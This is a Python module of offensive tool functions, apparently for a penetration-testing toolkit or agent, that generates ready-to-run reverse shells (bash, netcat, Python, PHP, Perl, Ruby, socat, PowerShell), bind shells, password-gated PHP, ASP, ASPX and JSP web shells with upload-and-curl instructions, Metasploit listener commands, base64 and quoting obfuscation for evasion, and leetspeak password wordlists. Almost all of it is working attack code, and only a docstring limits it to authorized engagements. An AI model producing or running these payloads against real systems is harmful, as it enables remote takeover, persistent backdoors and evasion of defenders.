"""Exploit & payload generators.

Ready-to-run reverse shells, bind shells, web shells, listener commands,
obfuscation helpers and credential wordlists for authorized engagements.
"""

import base64
import binascii
import datetime
import os
import re
import shlex
import textwrap

_SHELL_WARNING = (
    "# Authorized security testing only - the target must be in your "
    "engagement scope.\n"
)


def _esc(s):
    return s.replace("'", "'\\''")


def _b64(s):
    return base64.b64encode(s.encode("utf-8", "replace")).decode("ascii")


def tool_gen_reverse_shell(os_type="linux", lhost="127.0.0.1", lport=4444,
                           method="auto", encode=False):
    """Generate a ready-to-run reverse shell + matching listener."""
    os_type = (os_type or "linux").strip().lower()
    method = (method or "auto").strip().lower()
    try:
        lport = int(lport)
    except (TypeError, ValueError):
        return "Error: lport must be an integer."
    if not (1 <= lport <= 65535):
        return "Error: lport out of range 1-65535."

    if os_type == "windows":
        if method in ("auto", "powershell"):
            psh = ("$c=New-Object System.Net.Sockets.TCPClient('%s',%d);"
                   "$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};"
                   "while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object "
                   "-TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
                   "$r=(iex $d 2>&1|Out-String);"
                   "$t=[Text.Encoding]::ASCII.GetBytes($r);"
                   "$s.Write($t,0,$t.Length)};$c.Close()"
                   % (lhost, lport))
            payload = psh
        else:  # nc on windows
            payload = ("nc.exe %s %d -e cmd.exe" % (lhost, lport))
    else:  # linux
        if method in ("auto", "bash"):
            payload = ("bash -i >& /dev/tcp/%s/%d 0>&1" % (lhost, lport))
        elif method == "nc":
            payload = ("nc -e /bin/sh %s %d" % (lhost, lport))
        elif method == "python":
            payload = (
                "python3 -c 'import socket,subprocess,os;"
                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                "s.connect((\"%s\",%d));os.dup2(s.fileno(),0);"
                "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                "subprocess.call([\"/bin/sh\",\"-i\"])'" % (lhost, lport))
        elif method == "php":
            payload = (
                "php -r '$sock=fsockopen(\"%s\",%d);"
                "exec(\"/bin/sh -i <&3 >&3 2>&3\");'" % (lhost, lport))
        elif method == "perl":
            payload = (
                "perl -e 'use Socket;$i=\"%s\";$p=%d;"
                "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
                "open(STDIN,\">&S\");open(STDOUT,\">&S\");"
                "open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" % (lhost, lport))
        elif method == "ruby":
            payload = (
                "ruby -rsocket -e'f=TCPSocket.open(\"%s\",%d).to_i;"
                "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
                % (lhost, lport, lport, lport))
        elif method == "socat":
            payload = ("socat TCP:%s:%d EXEC:/bin/sh,pipes" % (lhost, lport))
        elif method == "msfvenom":
            payload = (
                "msfvenom -p linux/x64/shell_reverse_tcp LHOST=%s LPORT=%d "
                "-f elf -o /tmp/s.elf && /tmp/s.elf" % (lhost, lport))
        else:
            return ("Error: unknown method '%s' for linux. "
                    "Use auto|bash|nc|python|php|perl|ruby|socat|msfvenom"
                    % method)

    if encode:
        if os_type == "windows":
            payload = ("powershell -nop -w hidden -enc %s"
                       % _b64(payload))
        else:
            payload = "echo %s | base64 -d | bash" % _b64(payload)

    listener = tool_gen_listener(lhost, lport, upgrade=False)
    return (
        "# Reverse shell (%s -> %s:%d)\n%s\n\n"
        "# Listener to catch it:\n%s"
        % (os_type, lhost, lport, payload, listener))


def tool_gen_bind_shell(os_type="linux", port=4444, method="auto"):
    """Generate a bind shell payload for the target."""
    os_type = (os_type or "linux").strip().lower()
    method = (method or "auto").strip().lower()
    try:
        port = int(port)
    except (TypeError, ValueError):
        return "Error: port must be an integer."
    if not (1 <= port <= 65535):
        return "Error: port out of range 1-65535."

    if os_type == "windows":
        payload = ("powershell -nop -w hidden -c "
                   "$l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any,%d);"
                   "$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();"
                   "[byte[]]$b=0..65535|%%{0};"
                   "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
                   "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
                   "$r=(iex $d 2>&1|Out-String);"
                   "$t=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($t,0,$t.Length)};"
                   "$l.Stop()" % port)
    else:
        if method in ("auto", "nc"):
            payload = ("nc -lvnp %d -e /bin/sh" % port)
        elif method == "python":
            payload = (
                "python3 -c 'import socket,subprocess,os;"
                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                "s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
                "s.bind((\"0.0.0.0\",%d));s.listen(1);"
                "c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);"
                "os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" % port)
        elif method == "socat":
            payload = ("socat TCP-LISTEN:%d,reuseaddr,fork EXEC:/bin/sh,pipes" % port)
        else:
            return ("Error: unknown method '%s' for linux. "
                    "Use auto|nc|python|socat" % method)

    return ("# Bind shell (%s, port %d) - run on the TARGET, "
            "then connect with:\n#   nc <target-ip> %d\n\n%s"
            % (os_type, port, port, payload))


def tool_gen_webshell(platform="php", password="s3cr3t"):
    """Generate a minimal password-gated web shell."""
    platform = (platform or "php").strip().lower()
    password = password or "s3cr3t"

    if platform == "php":
        code = (
            "<?php\n$k=\"%s\";\nif(isset($_REQUEST[\"p\"]) && "
            "$_REQUEST[\"p\"]===$k){\n  $c=$_REQUEST[\"c\"]??\"id\";\n  "
            "echo \"<pre>\".shell_exec($c).\"</pre>\";\n}\n?>" % password)
        use = "curl 'http://TARGET/shell.php?p=%s&c=id'" % password
    elif platform in ("asp", "aspx"):
        if platform == "aspx":
            code = (
                "<%%@ Page Language=\"C#\" %%><%%@ Import Namespace=\"System."
                "Diagnostics\" %%>\n<%%\nstring k=\"%s\";\nif(Request[\"p\"]==k)"
                "{\n  Process p=new Process();p.StartInfo.FileName=\"cmd.exe\";"
                "p.StartInfo.Arguments=\"/c \"+Request[\"c\"];"
                "p.StartInfo.UseShellExecute=false;"
                "p.StartInfo.RedirectStandardOutput=true;p.Start();"
                "Response.Write(\"<pre>\"+p.StandardOutput.ReadToEnd()+\"</pre>\");\n}\n%%>"
                % password)
        else:
            code = (
                "<%%\nDim k:k=\"%s\"\nIf Request(\"p\")=k Then\n  "
                "Response.Write \"<pre>\"\n  "
                "Response.Write Server.CreateObject(\"WScript.Shell\")"
                ".Exec(\"cmd.exe /c \" & Request(\"c\")).StdOut.ReadAll\n  "
                "Response.Write \"</pre>\"\nEnd If\n%%>" % password)
        use = "curl 'http://TARGET/shell.aspx?p=%s&c=whoami'" % password
    elif platform == "jsp":
        code = (
            "<%%@ page import=\"java.io.*,java.util.*\" %%>\n<%%\nString k=\"%s\";"
            "\nif(k.equals(request.getParameter(\"p\"))){\n  "
            "String c=request.getParameter(\"c\")!=null?"
            "request.getParameter(\"c\"):\"id\";\n  Process pr=new ProcessBuilder"
            "(c.split(\" \")).redirectErrorStream(true).start();\n  "
            "BufferedReader br=new BufferedReader(new InputStreamReader"
            "(pr.getInputStream()));\n  String l;out.println(\"<pre>\");\n  "
            "while((l=br.readLine())!=null)out.println(l);\n  out.println"
            "(\"</pre>\");\n}\n%%>" % password)
        use = "curl 'http://TARGET/shell.jsp?p=%s&c=id'" % password
    else:
        return ("Error: unknown platform '%s'. Use php | asp | aspx | jsp"
                % platform)

    return ("# Web shell (%s) - password parameter 'p', command parameter 'c'\n"
            "# Upload this file to the web root, then:\n"
            "#   %s\n\n%s" % (platform, use, code))


def tool_gen_listener(lhost="0.0.0.0", lport=4444, upgrade=False):
    """Generate listener commands to catch a shell."""
    lhost = lhost or "0.0.0.0"
    try:
        lport = int(lport)
    except (TypeError, ValueError):
        return "Error: lport must be an integer."
    lines = ["# Listener on %s:%d" % (lhost, lport)]
    lines.append("nc -lvnp %d" % lport)
    lines.append("socat TCP-LISTEN:%d,reuseaddr,fork EXEC:/bin/bash" % lport)
    if upgrade:
        lines.append("# post-shell upgrade (linux):")
        lines.append("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
        lines.append("(Ctrl+Z, then: stty raw -echo; fg; export TERM=xterm)")
    lines.append("# interactive metasploit alternative:")
    lines.append("use exploit/multi/handler")
    lines.append("set PAYLOAD linux/x64/shell_reverse_tcp")
    lines.append("set LHOST %s" % lhost)
    lines.append("set LPORT %d" % lport)
    lines.append("run")
    return "\n".join(lines)


def tool_gen_obfuscate(payload="", technique="b64", os_type="linux"):
    """Obfuscate a command for evasion testing."""
    payload = (payload or "").strip()
    if not payload:
        return "Error: payload is required."
    technique = (technique or "b64").strip().lower()
    os_type = (os_type or "linux").strip().lower()

    if technique == "b64":
        if os_type == "windows":
            enc = _b64(payload)
            return ("# base64 (windows powershell)\n"
                    "powershell -nop -w hidden -enc %s" % enc)
        return ("# base64 (linux)\necho %s | base64 -d | bash"
                % _b64(payload))
    if technique == "single_quote":
        parts = ["'%s'" % c if c in " '\"\\$`" else c for c in payload]
        return ("# single-quote interleaving (linux)\n%s"
                % "".join(parts))
    if technique == "double_quote":
        if os_type == "windows":
            return ("# caret escaping (windows cmd)\n%s"
                    % "".join("^%s" % c if c in "&|<>()%^" else c
                              for c in payload))
        return ("# double-quote interleaving (linux)\n%s"
                % "".join('"%s"' % c if c in " '\"\\$`" else c
                          for c in payload))
    if technique == "unicode":
        if os_type != "windows":
            return "Error: unicode technique is only meaningful on windows."
        out = []
        for c in payload:
            if c.isalnum():
                n = ord(c)
                out.append("$([char]%d)" % n)
            else:
                out.append(c)
        return ("# unicode/char-code (windows powershell)\n"
                "%s" % "".join(out))
    return ("Error: unknown technique '%s'. Use b64 | single_quote | "
            "double_quote | unicode" % technique)


def tool_gen_wordlist(base_words="", l33t=True, suffixes=""):
    """Generate a candidate wordlist from base words + leetspeak + suffixes."""
    if not (base_words or "").strip():
        return "Error: base_words is required (comma or newline separated)."
    words = []
    for part in re.split(r"[,;\n]+", base_words):
        part = part.strip()
        if part:
            words.append(part)

    out = list(words)
    leet_map = {
        "a": "4", "e": "3", "i": "1", "o": "0", "s": "5",
        "t": "7", "b": "8", "g": "9",
    }
    if l33t:
        for w in words:
            variants = {w}
            for k, v in leet_map.items():
                if k in w.lower():
                    variants.add(w.lower().replace(k, v))
                    variants.add(w.upper().replace(k.upper(), v))
            out.extend(sorted(variants))

    if suffixes:
        sufs = [s.strip() for s in re.split(r"[,;\n]+", suffixes) if s.strip()]
        for w in list(out):
            for s in sufs:
                out.append(w + s)
                out.append(w.capitalize() + s)

    seen, ordered = set(), []
    for w in out:
        if w not in seen:
            seen.add(w)
            ordered.append(w)

    return ("# %d unique candidates from %d base word(s)\n%s"
            % (len(ordered), len(words), "\n".join(ordered)))


__all__ = [
    "tool_gen_reverse_shell", "tool_gen_bind_shell", "tool_gen_webshell",
    "tool_gen_listener", "tool_gen_obfuscate", "tool_gen_wordlist",
]
